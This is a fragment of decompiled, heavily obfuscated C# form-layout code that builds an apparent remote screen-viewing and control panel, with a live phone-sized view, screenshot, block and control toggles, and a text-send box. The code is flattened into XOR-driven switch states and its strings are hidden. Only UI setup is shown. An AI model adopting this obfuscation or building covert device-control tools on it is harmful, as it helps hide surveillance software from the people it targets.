            this.Qualtibox.Name = EXGuarder.\u00370162F21;
            this.Qualtibox.Padding = new Padding(0, 0, 30, 0);
            this.Qualtibox.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1351639537 ^ -1391724238;
            continue;
          case 164:
            this.StartButton.Size = new Size(100, 48);
            this.StartButton.Style = UIStyle.Custom;
            num1 = (int) num3 * 1941630380 ^ -1803946801;
            continue;
          case 165:
            this.Panel7.Location = new Point(424, 0);
            num1 = (int) num3 * 2011857145 ^ 338498403;
            continue;
          case 166:
            this.Panel7.BackColor = Color.Black;
            num1 = (int) num3 * -897917998 ^ 1925535349;
            continue;
          case 167:
            this.StartButton.Text = EXGuarder.\u00331436B34;
            this.DrakeUIToolTip1.SetToolTip((Control) this.StartButton, EXGuarder.\u00331436B34);
            this.Panel9.BackColor = Color.Black;
            num1 = (int) num3 * -1644236359 ^ 1642527355;
            continue;
          case 168:
            this.chkctrl = new DrakeUICheckBox();
            this.checkblock = new DrakeUICheckBox();
            this.StopButton = new DrakeUIAvatar();
            num1 = (int) num3 * 87777120 ^ 1737944356;
            continue;
          case 169:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar4, EXGuarder.\u003666C4426);
            num1 = (int) num3 * 2105941291 ^ -1302389920;
            continue;
          case 170:
            this.StopButton.FillColor = Color.Transparent;
            num1 = (int) num3 * 542446095 ^ -1346860627;
            continue;
          case 171:
            this.pinbtn.Style = UIStyle.Custom;
            this.pinbtn.Symbol = 61581;
            this.pinbtn.SymbolSize = 30;
            num1 = (int) num3 * 1846384713 ^ 1641785085;
            continue;
          case 172:
            this.StopButton.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1835967816 ^ -127196575;
            continue;
          case 173:
            this.DrakeUIAvatar4.Text = EXGuarder.\u0034860670F;
            num1 = (int) num3 * 94515897 ^ -15757127;
            continue;
          case 174:
            this.Panel9.Size = new Size(100, 28);
            num1 = (int) num3 * 457270827 ^ -1313001161;
            continue;
          case 175:
            this.DrakeUIAvatar4.Symbol = 61713;
            num1 = (int) num3 * 1926483417 ^ -1259350888;
            continue;
          case 176:
            this.PBS.FillColor = Color.Black;
            num1 = (int) num3 * 2135228043 ^ 2142263627;
            continue;
          case 177:
            this.Panel5.TabIndex = 4;
            num1 = (int) num3 * -70617757 ^ -1895609003;
            continue;
          case 178:
            this.Panel6.SuspendLayout();
            num1 = (int) num3 * -756045779 ^ 770182517;
            continue;
          case 179:
            this.Panel3.Dock = DockStyle.Right;
            this.Panel3.Location = new Point(408, 55);
            num1 = (int) num3 * -546770060 ^ -326596012;
            continue;
          case 180:
            this.refreshtimer = new Timer(((Updater) this).components);
            num1 = (int) num3 * 513094086 ^ -400301157;
            continue;
          case 181:
            this.Panel6.BackColor = Color.Transparent;
            this.Panel6.BackgroundImage = (Image) componentResourceManager.GetObject(EXGuarder.\u00371696A29);
            num1 = (int) num3 * 495409366 ^ -302373828;
            continue;
          case 182:
            this.Dismisbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1799173006 ^ 103633412;
            continue;
          case 183:
            this.pinbtn.TabIndex = 30;
            this.pinbtn.TagString = EXGuarder.\u003623A1B33;
            this.DrakeUIToolTip1.SetToolTip((Control) this.pinbtn, EXGuarder.\u0033F1B592F);
            num1 = (int) num3 * -2105284530 ^ 1100048790;
            continue;
          case 184:
            this.Save.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * -473710452 ^ -241747094;
            continue;
          case 185:
            this.pinbtn.Size = new Size(49, 39);
            num1 = (int) num3 * -310838572 ^ 1187499251;
            continue;
          case 186:
            this.combosize.Style = UIStyle.Custom;
            num1 = (int) num3 * -402060963 ^ 1179566449;
            continue;
          case 187:
            this.Dismisbtn.AvatarSize = 45;
            num1 = (int) num3 * -1713461436 ^ 1555082205;
            continue;
          case 188:
            this.Panel1.TabIndex = 2;
            num1 = (int) num3 * -1297767414 ^ 1092278971;
            continue;
          case 189:
            this.chkctrl.StyleCustomMode = true;
            num1 = (int) num3 * -1016095876 ^ -1782783070;
            continue;
          case 190:
            this.Livepicbox.Size = new Size(392, 709);
            this.Livepicbox.SizeMode = PictureBoxSizeMode.StretchImage;
            num1 = (int) num3 * 1280843753 ^ 1666627204;
            continue;
          case 191:
            this.PBS.Location = new Point(0, 0);
            this.PBS.Margin = new Padding(4);
            num1 = (int) num3 * 1615293319 ^ -2047144387;
            continue;
          case 192:
            this.SKtype.Size = new Size(100, 26);
            num1 = (int) num3 * -1757818052 ^ -287857539;
            continue;
          case 193:
            this.Panel4 = new Panel();
            num1 = (int) num3 * -53513682 ^ -205611742;
            continue;
          case 194:
            this.Panel5.Location = new Point(0, 809);
            num1 = (int) num3 * 1074486117 ^ 1456330169;
            continue;
          case 195:
            this.Panel3.Margin = new Padding(4);
            this.Panel3.Name = EXGuarder.\u00369440957;
            num1 = (int) num3 * -300188939 ^ 1935656308;
            continue;
          case 196:
            this.Panel9.Controls.Add((Control) this.DrakeUIAvatar5);
            this.Panel9.Controls.Add((Control) this.DrakeUIAvatar6);
            this.Panel9.Dock = DockStyle.Top;
            num1 = (int) num3 * -2041330775 ^ 471123840;
            continue;
          case 197:
            this.Panel1.Controls.Add((Control) this.vewpnl);
            this.Panel1.Controls.Add((Control) this.PBS);
            this.Panel1.Dock = DockStyle.Fill;
            num1 = (int) num3 * 1384803058 ^ 1508599685;
            continue;
          case 198:
            this.combosize.Name = EXGuarder.\u0033470264A;
            this.combosize.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num3 * 1856000303 ^ 818899868;
            continue;
          case 199:
            this.Panel9.Name = EXGuarder.\u00349213453;
            num1 = (int) num3 * -403647118 ^ 35154049;
            continue;
          case 200:
            this.textsend.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * 1628106746 ^ -265822665;
            continue;
          case 202:
            this.PictureBox2.TabStop = false;
            num1 = (int) num3 * -1937414580 ^ 876954188;
            continue;
          case 203:
            this.StartButton.Location = new Point(0, 28);
            num1 = (int) num3 * 660750929 ^ -1187751123;
            continue;
          case 204:
            this.FPSBOX.Text = EXGuarder.\u0035B72704F;
            num1 = (int) num3 * 808700172 ^ 1954761353;
            continue;
          case 205:
            this.DrakeUIAvatar1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIAvatar1.Location = new Point(337, 13);
            this.DrakeUIAvatar1.Name = EXGuarder.\u0036614513D;
            num1 = (int) num3 * -2079357564 ^ -1922893184;
            continue;
          case 206:
            this.DrakeUIAvatar4.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -824934733 ^ -1880585317;
            continue;
          case 207:
            this.SKtype.Text = EXGuarder.\u0034130250C;
            num1 = (int) num3 * -1402393787 ^ 255031555;
            continue;
          case 208:
            this.DrakeUIAvatar9.SymbolSize = 30;
            num1 = (int) num3 * -632653178 ^ -1270465703;
            continue;
          case 209:
            this.DrakeUIAvatar7.Symbol = 61641;
            this.DrakeUIAvatar7.SymbolSize = 25;
            num1 = (int) num3 * -74195283 ^ -1713249240;
            continue;
          case 210:
            this.DrakeUIAvatar6.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * 1258789354 ^ -1065985571;
            continue;
          case 211:
            this.PBS.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * 1809103991 ^ 421852802;
            continue;
          case 212:
            this.DrakeUIToolTip1.SetToolTip((Control) this.StopButton, EXGuarder.\u00348343D6A);
            num1 = (int) num3 * 86431971 ^ 1708546395;
            continue;
          case 213:
            this.toptitle.TextAlign = ContentAlignment.MiddleLeft;
            this.PBS.Dock = DockStyle.Top;
            num1 = (int) num3 * -425672529 ^ -1327689180;
            continue;
          case 214:
            this.Label6.TextAlign = ContentAlignment.MiddleCenter;
            this.Qualtibox.Dock = DockStyle.Top;
            num1 = (int) num3 * 1149067638 ^ -890570187;
            continue;
          case 215:
            this.scshotbtn.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -2038297270 ^ 1293615952;
            continue;
          case 216:
            this.Qualtibox.TabIndex = 28;
            this.Qualtibox.Text = EXGuarder.\u003132A5950;
            this.Qualtibox.TextAlignment = ContentAlignment.MiddleLeft;
            this.Label5.Dock = DockStyle.Top;
            this.Label5.Font = new Font(EXGuarder.\u00312702070, 10f);
            this.Label5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label5.Location = new Point(0, 496);
            num1 = (int) num3 * -2015721119 ^ 565664236;
            continue;
          case 217:
            this.Label2.Text = EXGuarder.\u00373225571;
            num1 = (int) num3 * 101794581 ^ -931189177;
            continue;
          case 218:
            this.Panel3 = new Panel();
            num1 = (int) num3 * 1243120063 ^ 1702371398;
            continue;
          case 219:
            this.Panel5.Controls.Add((Control) this.DrakeUIAvatar2);
            num1 = (int) num3 * -617119899 ^ 1849126430;
            continue;
          case 220:
            this.Panel7.Controls.Add((Control) this.Label1);
            num1 = (int) num3 * -617796197 ^ -1722016173;
            continue;
          case 221:
            this.PictureBox3.Margin = new Padding(4);
            this.PictureBox3.Name = EXGuarder.\u003146E2A21;
            num1 = (int) num3 * -1086561707 ^ 1320122580;
            continue;
          case 222:
            this.Label7.Text = EXGuarder.\u00333284453;
            num1 = (int) num3 * -1903938154 ^ -1956562132;
            continue;
          case 223:
            this.Panel4.Size = new Size(16, 754);
            num1 = (int) num3 * -1197774410 ^ 1080667587;
            continue;
          case 224:
            this.Livepicbox.Name = EXGuarder.\u0031D710146;
            num1 = (int) num3 * 1264136780 ^ 1095643786;
            continue;
          case 225:
            this.checkblock.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkblock.Location = new Point(0, 193);
            this.checkblock.Margin = new Padding(4);
            this.checkblock.Name = EXGuarder.\u0034D102152;
            this.checkblock.Padding = new Padding(22, 0, 0, 0);
            this.checkblock.Size = new Size(100, 62);
            num1 = (int) num3 * 623261825 ^ 736240889;
            continue;
          case 226:
            this.DrakeUIAvatar2.Location = new Point(352, 7);
            num1 = (int) num3 * 1582360345 ^ -1315514360;
            continue;
          case 227:
            this.combosize.FillColor = Color.Black;
            this.combosize.Font = new Font(EXGuarder.\u00312702070, 9f);
            num1 = (int) num3 * -492460647 ^ 1176842128;
            continue;
          case 228:
            this.DrakeUIAvatar9.Size = new Size(49, 39);
            num1 = (int) num3 * 1092159264 ^ -551904613;
            continue;
          case 229:
            this.StartButton.Name = EXGuarder.\u003211B0E14;
            num1 = (int) num3 * -925975134 ^ 1303624648;
            continue;
          case 230:
            this.DrakeUIAvatar4.TabIndex = 36;
            num1 = (int) num3 * 1207296966 ^ 566640029;
            continue;
          case 231:
            this.combosize.TabIndex = 26;
            this.combosize.Text = EXGuarder.\u0033F292C48;
            this.combosize.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * -1094322706 ^ -1222054818;
            continue;
          case 232:
            this.StopButton.Size = new Size(100, 48);
            num1 = (int) num3 * -1753939216 ^ -134727294;
            continue;
          case 233:
            this.StopButton.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * 1401285512 ^ -48756426;
            continue;
          case 234:
            this.Panel1.Size = new Size(392, 754);
            num1 = (int) num3 * -1876589210 ^ 1503205413;
            continue;
          case 235:
            this.Panel9.TabIndex = 34;
            num1 = (int) num3 * -912366203 ^ 795719646;
            continue;
          case 236:
            this.Livepicbox.Enabled = false;
            num1 = (int) num3 * 1874357891 ^ -1881910444;
            continue;
          case 237:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar2, EXGuarder.\u0031E520B5E);
            num1 = (int) num3 * 1166318715 ^ 1050453375;
            continue;
          case 238:
            this.DrakeUIAvatar3.AvatarSize = 45;
            this.DrakeUIAvatar3.Cursor = Cursors.Hand;
            this.DrakeUIAvatar3.Dock = DockStyle.Bottom;
            num1 = (int) num3 * 818401467 ^ 1354151219;
            continue;
          case 239:
            this.Panel8.SuspendLayout();
            num1 = (int) num3 * 2002813781 ^ 965607665;
            continue;
          case 240:
            this.combosize.Margin = new Padding(5, 6, 5, 6);
            this.combosize.MinimumSize = new Size(84, 0);
            num1 = (int) num3 * 1684132902 ^ -1500646316;
            continue;
          case 241:
            this.DrakeUIAvatar1.Style = UIStyle.Custom;
            num1 = (int) num3 * 1371634460 ^ 881821677;
            continue;
          case 242:
            this.SKtype.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * -2053461255 ^ 610674239;
            continue;
          case 243:
            this.DrakeUIAvatar5.Location = new Point(34, 0);
            num1 = (int) num3 * -721256020 ^ 1690382518;
            continue;
          case 244:
            this.toptitle.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * 1487155596 ^ -26103072;
            continue;
          case 245:
            this.Label6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label6.Location = new Point(0, 561);
            this.Label6.Margin = new Padding(4, 0, 4, 0);
            this.Label6.Name = EXGuarder.\u00321541A02;
            num1 = (int) num3 * 1863642117 ^ 1468560201;
            continue;
          case 246:
            this.DrakeUIAvatar9.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1183254392 ^ -1675962313;
            continue;
          case 247:
            this.Dismisbtn.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * 1201203181 ^ -931519861;
            continue;
          case 248:
            this.Panel5.Margin = new Padding(4);
            this.Panel5.Name = EXGuarder.\u00373646E75;
            this.Panel5.Size = new Size(424, 59);
            num1 = (int) num3 * 60189159 ^ -737871319;
            continue;
          case 249:
            this.DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            num1 = (int) num3 * 1942719277 ^ -1852920102;
            continue;
          case 250:
            this.DrakeUIAvatar7.Size = new Size(100, 48);
            this.DrakeUIAvatar7.Style = UIStyle.Custom;
            num1 = (int) num3 * -1592098511 ^ 451163793;
            continue;
          case 251:
            this.Label4.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 1877599841 ^ 404435227;
            continue;
          case 252:
            this.SKtype = new DrakeUIComboBox();
            this.scshotbtn = new DrakeUIAvatar();
            num1 = (int) num3 * -2053626767 ^ -599921411;
            continue;
          case 253:
            this.PictureBox2 = new PictureBox();
            num1 = (int) num3 * -505355858 ^ 541081799;
            continue;
          case 254:
            this.DrakeUIAvatar6.Dock = DockStyle.Right;
            num1 = (int) num3 * -830544989 ^ 732466220;
            continue;
          case (uint) byte.MaxValue:
            this.Label5.Size = new Size(100, 18);
            num1 = (int) num3 * -2087754447 ^ -1369422343;
            continue;
          case 256:
            this.DrakeUIAvatar7.TabIndex = 37;
            this.DrakeUIAvatar7.Text = EXGuarder.\u00337686B77;
            num1 = (int) num3 * 52439497 ^ 590730648;
            continue;
          case 257:
            this.PBS.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1818029270 ^ -1186783473;
            continue;
          case 258:
            this.scshotbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 508263981 ^ 194298263;
            continue;
          case 259:
            this.FPSBOX.Dock = DockStyle.Top;
            num1 = (int) num3 * -589155577 ^ -439733866;
            continue;
          case 260:
            this.Panel3.TabIndex = 3;
            this.Panel4.BackColor = Color.Transparent;
            this.Panel4.Dock = DockStyle.Left;
            this.Panel4.Location = new Point(0, 55);
            this.Panel4.Margin = new Padding(4);
            this.Panel4.Name = EXGuarder.\u00302393900;
            num1 = (int) num3 * -1545556542 ^ 1266756884;
            continue;
          case 261:
            this.Label2.TextAlign = ContentAlignment.MiddleCenter;
            this.Label1.Dock = DockStyle.Top;
            this.Label1.Font = new Font(EXGuarder.\u00312702070, 10f);
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label1.Location = new Point(0, 514);
            num1 = (int) num3 * -284466263 ^ -1800697009;
            continue;
          case 262:
            this.Qualtibox.Items.AddRange(new object[10]
            {
              (object) EXGuarder.\u003792E2533,
              (object) EXGuarder.\u0036E696635,
              (object) EXGuarder.\u0032A24616F,
              (object) EXGuarder.\u00323794E49,
              (object) EXGuarder.\u0034F190B3D,
              (object) EXGuarder.\u00320584464,
              (object) EXGuarder.\u003443B0206,
              (object) EXGuarder.\u00339123A58,
              (object) EXGuarder.\u003075E335E,
              (object) EXGuarder.\u003132A5950
            });
            this.Qualtibox.Location = new Point(0, 535);
            num1 = (int) num3 * 1553427233 ^ -1166780372;
            continue;
          case 263:
            this.DrakeUIAvatar7.AvatarSize = 45;
            this.DrakeUIAvatar7.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1213142577 ^ -1305194019;
            continue;
          case 264:
            this.Save.TabIndex = 19;
            num1 = (int) num3 * 846030481 ^ -1044128966;
            continue;
          case 265:
            this.DrakeUIAvatar2.SymbolSize = 25;
            this.DrakeUIAvatar2.TabIndex = 45;
            num1 = (int) num3 * 1173055946 ^ 872266100;
            continue;
          case 266:
            this.Save.Text = EXGuarder.\u003762B036A;
            num1 = (int) num3 * -1340095254 ^ 2072060919;
            continue;
          case 267:
            this.SKtype.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num3 * 961548314 ^ 1065554821;
            continue;
          case 268:
            this.DrakeUIAvatar5.Dock = DockStyle.Right;
            num1 = (int) num3 * -223888165 ^ 1403281748;
            continue;
          case 269:
            this.DrakeUIAvatar5.SymbolSize = 20;
            this.DrakeUIAvatar5.TabIndex = 30;
            num1 = (int) num3 * -1622569798 ^ 1383873889;
            continue;
          case 270:
            this.Panel6.BackgroundImageLayout = ImageLayout.Zoom;
            this.Panel6.Controls.Add((Control) this.Panel1);
            this.Panel6.Controls.Add((Control) this.Panel4);
            num1 = (int) num3 * 1911529002 ^ 477209458;
            continue;
          case 271:
            this.Panel7.Controls.Add((Control) this.Label6);
            num1 = (int) num3 * 882425850 ^ -1778743186;
            continue;
          case 272:
            this.DrakeUIAvatar5.Name = EXGuarder.\u00327427766;
            this.DrakeUIAvatar5.Size = new Size(33, 28);
            this.DrakeUIAvatar5.Style = UIStyle.Custom;
            num1 = (int) num3 * -476053034 ^ 392843304;
            continue;
          case 273:
            this.FPSBOX.Margin = new Padding(5, 6, 5, 6);
            this.FPSBOX.MinimumSize = new Size(84, 0);
            num1 = (int) num3 * 923354037 ^ 1502480276;
            continue;
          case 274:
            this.Label6.Text = EXGuarder.\u0030D5D6943;
            num1 = (int) num3 * 1568728660 ^ -766169589;
            continue;
          case 275:
            this.DrakeUIAvatar6.Symbol = 61453;
            this.DrakeUIAvatar6.SymbolSize = 20;
            num1 = (int) num3 * 1958932626 ^ 48624412;
            continue;
          case 276:
            this.DrakeUIAvatar9.Text = EXGuarder.\u0036378472E;
            num1 = (int) num3 * 130838431 ^ 1991569162;
            continue;
          case 277:
            this.Panel7.SuspendLayout();
            num1 = (int) num3 * -163743905 ^ 1217217769;
            continue;
          case 278:
            this.DrakeUIAvatar7 = new DrakeUIAvatar();
            this.combosize = new DrakeUIComboBox();
            num1 = (int) num3 * -1538223243 ^ 37901560;
            continue;
          case 279:
            this.DrakeUIToolTip1.SetToolTip((Control) this.chkctrl, EXGuarder.\u00350001462);
            this.checkblock.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.checkblock.Cursor = Cursors.Hand;
            this.checkblock.Dock = DockStyle.Top;
            this.checkblock.Font = new Font(EXGuarder.\u00312702070, 10f);
            num1 = (int) num3 * 1238328658 ^ 543825972;
            continue;
          case 280:
            goto label_1;
          case 281:
            this.DrakeUIAvatar2.Text = EXGuarder.\u003621F3858;
            num1 = (int) num3 * -1175987387 ^ 888058702;
            continue;
          case 282:
            this.Label5.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -198064915 ^ 352630640;
            continue;
          case 283:
            this.FPSBOX.DropDownStyle = UIDropDownStyle.DropDownList;
            this.FPSBOX.FillColor = Color.Black;
            num1 = (int) num3 * 20554825 ^ -1702443038;
            continue;
          case 284:
            this.DrakeUIAvatar1.Size = new Size(49, 39);
            num1 = (int) num3 * 1526752267 ^ -1893490818;
            continue;
          case 285:
            this.DrakeUIAvatar4.Dock = DockStyle.Bottom;
            this.DrakeUIAvatar4.FillColor = Color.Transparent;
            num1 = (int) num3 * -1806090048 ^ 1611717351;
            continue;
          case 286:
            this.Dismisbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 627916584 ^ -33472477;
            continue;
          case 287:
            this.vewpnl.Location = new Point(0, 23);
            num1 = (int) num3 * 2108053592 ^ 498683957;
            continue;
          case 288:
            this.Panel8 = new Panel();
            this.toptitle = new Label();
            this.PBS = new DrakeUIProcessBar();
            this.Panel1 = new Panel();
            num1 = (int) num3 * -1615393882 ^ -1913957754;
            continue;
          case 289:
            this.DrakeUIAvatar7.Dock = DockStyle.Bottom;
            this.DrakeUIAvatar7.FillColor = Color.Transparent;
            this.DrakeUIAvatar7.Font = new Font(EXGuarder.\u00312702070, 12f);
            this.DrakeUIAvatar7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIAvatar7.Location = new Point(0, 724);
            num1 = (int) num3 * -1240803832 ^ 300705475;
            continue;
          case 290:
            this.Label1.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * 446591202 ^ 550841558;
            continue;
          case 291:
            this.chkctrl.Size = new Size(100, 62);
            this.chkctrl.Style = UIStyle.Custom;
            num1 = (int) num3 * 859973415 ^ 2011613252;
            continue;
          case 292:
            this.DrakeUIToolTip1.SetToolTip((Control) this.Dismisbtn, EXGuarder.\u00371596762);
            this.Dismisbtn.Visible = false;
            num1 = (int) num3 * -360214601 ^ 506447023;
            continue;
          case 293:
            this.Panel2.TabIndex = 2;
            num1 = (int) num3 * -538795317 ^ 850415052;
            continue;
          case 294:
            this.Panel9.ResumeLayout(false);
            num1 = (int) num3 * -1308876495 ^ -808120830;
            continue;
          case 295:
            this.PictureBox3.Location = new Point(83, 23);
            num1 = (int) num3 * 934970245 ^ 2036062129;
            continue;
          case 296:
            this.presstimer = new Timer(((Updater) this).components);
            num1 = (int) num3 * -133272454 ^ -158417485;
            continue;
          case 297:
            this.PBS.TabIndex = 2;
            num1 = (int) num3 * 967920340 ^ -1522310403;
            continue;
          case 298:
            this.chkctrl.Font = new Font(EXGuarder.\u00312702070, 10f);
            num1 = (int) num3 * 1600220698 ^ 632462327;
            continue;
          case 299:
            this.Panel6.Controls.Add((Control) this.Panel2);
            num1 = (int) num3 * 145733399 ^ -210261992;
            continue;
          case 300:
            this.StopButton.Icon = DrakeUIAvatar.UIIcon.Text;
            num1 = (int) num3 * 1197337886 ^ -1180104180;
            continue;
          case 301:
            this.StartButton.SymbolSize = 25;
            this.StartButton.TabIndex = 32;
            num1 = (int) num3 * 997976210 ^ -1931105471;
            continue;
          case 302:
            this.Label4.Font = new Font(EXGuarder.\u00317515A74, 10f, FontStyle.Bold);
            this.Label4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label4.Location = new Point(0, 439);
            num1 = (int) num3 * 521343077 ^ -1080153248;
            continue;
          case 303:
            this.combosize.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.combosize.Size = new Size(100, 26);
            num1 = (int) num3 * -2077740829 ^ -997190301;
            continue;
          case 304:
            this.DrakeUIAvatar5 = new DrakeUIAvatar();
            this.DrakeUIAvatar6 = new DrakeUIAvatar();
            num1 = (int) num3 * -1957993431 ^ 1945498170;
            continue;
          case 305:
            this.DrakeUIAvatar9.AvatarSize = 30;
            num1 = (int) num3 * -1478931622 ^ -1472850016;
            continue;
          case 306:
            this.Panel3.BackColor = Color.Transparent;
            num1 = (int) num3 * -246836706 ^ -1770293392;
            continue;
          case 307:
            this.vewpnl.ResumeLayout(false);
            this.Panel8.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            num1 = (int) num3 * 1364780432 ^ -1756425683;
            continue;
          case 308:
            this.Save.TextAlign = ContentAlignment.TopLeft;
            num1 = (int) num3 * 1819931304 ^ -523475826;
            continue;
          case 309:
            this.pinbtn.Name = EXGuarder.\u00360506C27;
            num1 = (int) num3 * -559083794 ^ 1124818290;
            continue;
          case 310:
            this.textsend.StyleCustomMode = true;
            this.textsend.TabIndex = 44;
            this.textsend.TextAlignment = ContentAlignment.TopCenter;
            this.textsend.Watermark = EXGuarder.\u00356176B08;
            num1 = (int) num3 * -1667367355 ^ -441838417;
            continue;
          case 311:
            this.Panel7.Controls.Add((Control) this.checkblock);
            this.Panel7.Controls.Add((Control) this.Save);
            this.Panel7.Controls.Add((Control) this.StopButton);
            num1 = (int) num3 * 939491618 ^ 813825786;
            continue;
          case 312:
            this.toptitle.Text = EXGuarder.\u003141C4248;
            num1 = (int) num3 * 1214556659 ^ 30247456;
            continue;
          case 313:
            this.Panel7.Margin = new Padding(4);
            this.Panel7.Name = EXGuarder.\u0035C0A6F72;
            this.Panel7.Size = new Size(100, 868);
            this.Panel7.TabIndex = 2;
            num1 = (int) num3 * -2089844677 ^ 1399021717;
            continue;
          case 314:
            this.vewpnl.Dock = DockStyle.Fill;
            num1 = (int) num3 * 882697747 ^ -777579243;
            continue;
          case 315:
            this.DrakeUIAvatar9.Style = UIStyle.Custom;
            this.DrakeUIAvatar9.Symbol = 61758;
            num1 = (int) num3 * 874590924 ^ -2135016147;
            continue;
          case 316:
            this.scshotbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1065789391 ^ -369471955;
            continue;
          case 317:
            this.DrakeUIAvatar4.Size = new Size(100, 48);
            this.DrakeUIAvatar4.Style = UIStyle.Custom;
            num1 = (int) num3 * 1789889887 ^ 1286926125;
            continue;
          case 318:
            this.chkctrl.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.chkctrl.Location = new Point(0, (int) byte.MaxValue);
            num1 = (int) num3 * -303097136 ^ -1944636310;
            continue;
          case 319:
            this.textsend.Cursor = Cursors.IBeam;
            this.textsend.FillColor = Color.Black;
            num1 = (int) num3 * 78263557 ^ 1020672491;
            continue;
          case 320:
            this.Panel7.Controls.Add((Control) this.Label5);
            num1 = (int) num3 * 1489676592 ^ -1391705883;
            continue;
          case 321:
            this.DrakeUIAvatar5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1416924857 ^ -645758458;
            continue;
          case 322:
            this.toptitle.Size = new Size(392, 22);
            num1 = (int) num3 * -794187370 ^ 1739467146;
            continue;
          case 323:
            this.DrakeUIAvatar2.FillColor = Color.Transparent;
            this.DrakeUIAvatar2.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -1399015509 ^ 480308439;
            continue;
          case 324:
            this.DrakeUIAvatar2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -193776389 ^ 519304283;
            continue;
          case 325:
            this.MinimumSize = new Size(443, 603);
            this.Name = EXGuarder.\u0036971143F;
            num1 = (int) num3 * -1478087596 ^ -1775272250;
            continue;
          case 326:
            this.DrakeUIAvatar2.AvatarSize = 45;
            num1 = (int) num3 * 1644891153 ^ -1040110133;
            continue;
          case 327:
            this.Label1.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * 386955029 ^ -676343726;
            continue;
          case 328:
            this.StartButton.Dock = DockStyle.Top;
            this.StartButton.FillColor = Color.Transparent;
            num1 = (int) num3 * -1708284242 ^ 926980924;
            continue;
          case 329:
            this.SKtype.Margin = new Padding(5, 6, 5, 6);
            this.SKtype.MinimumSize = new Size(84, 0);
            this.SKtype.Name = EXGuarder.\u003701D3F5F;
            num1 = (int) num3 * -366542067 ^ 1027122114;
            continue;
          case 330:
            this.Dismisbtn.Location = new Point(0, 391);
            this.Dismisbtn.Name = EXGuarder.\u0033071166D;
            this.Dismisbtn.Size = new Size(100, 48);
            num1 = (int) num3 * -358704915 ^ 283730739;
            continue;
          case 331:
            this.StartButton.Cursor = Cursors.Hand;
            num1 = (int) num3 * -182802599 ^ -996690636;
            continue;
          case 332:
            this.DrakeUIAvatar2.Style = UIStyle.Custom;
            this.DrakeUIAvatar2.Symbol = 61912;
            num1 = (int) num3 * 1568816475 ^ -1441534376;
            continue;
          case 333:
            this.Qualtibox.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.Qualtibox.Size = new Size(100, 26);
            this.Qualtibox.Style = UIStyle.Custom;
            this.Qualtibox.StyleCustomMode = true;
            num1 = (int) num3 * 1064756847 ^ 1201864462;
            continue;
          case 334:
            this.DrakeUIAvatar6.Size = new Size(33, 28);
            this.DrakeUIAvatar6.Style = UIStyle.Custom;
            num1 = (int) num3 * -1330731965 ^ -232260215;
            continue;
          case 335:
            this.Livepicbox.BackColor = Color.Black;
            num1 = (int) num3 * -1670277441 ^ -1609499527;
            continue;
          case 336:
            this.SKtype.StyleCustomMode = true;
            num1 = (int) num3 * 168272027 ^ 915551667;
            continue;
          case 337:
            this.Panel6.Controls.Add((Control) this.Panel3);
            this.Panel6.Controls.Add((Control) this.Panel5);
            num1 = (int) num3 * 2023751042 ^ -1357822753;
            continue;
          case 338:
            this.Panel9.SuspendLayout();
            this.SuspendLayout();
            num1 = (int) num3 * 2037671056 ^ 861408385;
            continue;
          case 339:
            this.Panel9.Location = new Point(0, 0);
            num1 = (int) num3 * -570031234 ^ 391679984;
            continue;
          case 340:
            this.DrakeUIAvatar4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 525971080 ^ 1402759953;
            continue;
          case 341:
            this.SKtype.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0034130250C,
